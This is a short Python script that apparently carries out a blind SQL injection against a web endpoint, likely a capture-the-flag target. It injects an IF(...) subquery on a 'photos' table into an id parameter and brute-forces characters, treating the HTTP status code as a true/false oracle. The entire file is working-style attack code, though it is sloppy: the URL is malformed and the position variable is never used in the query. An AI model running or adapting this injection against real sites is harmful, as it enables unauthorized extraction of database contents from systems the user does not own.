import requests

def char_range(c1, c2):
    for c in range(ord(c1), ord(c2)+1):
        yield chr(c)

def fetch(value, pos):
    r = requests.get("http:/x.x.x.x/c54a072bff/fetch?id=IF((select count(*) from photos)='"+value+"',3,4)")
    if r.status_code != 404:
        print(value)
        return True
    return False    

    
print("Hallo")

testrange = []
testrange += char_range('a', 'z')
testrange += char_range('0', '9')
testrange += char_range('A', 'Z')
print(testrange)

pos=1
max=10

while pos <= max:
    print("Pos: "+str(pos)+" ", end="")
    for word in testrange:
        found = fetch(word,pos)
        if found:
            break
    pos += 1






